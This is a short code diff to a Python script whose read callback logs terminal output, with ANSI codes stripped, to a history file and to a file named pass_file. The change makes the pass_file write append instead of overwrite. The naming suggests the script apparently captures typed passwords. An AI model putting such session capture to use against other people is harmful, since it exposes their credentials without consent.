@@ -23,7 +23,7 @@ ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
 def read(fd):
     data = os.read(fd, 1024)
     #script.write(data)
-    with open(pass_file, 'w') as pf:
+    with open(pass_file, 'a') as pf:
         pf.write(ansi_escape.sub('',data.decode("utf-8")))
     with open(hist_file, 'a') as pf:
         pf.write(ansi_escape.sub('',data.decode("utf-8")))
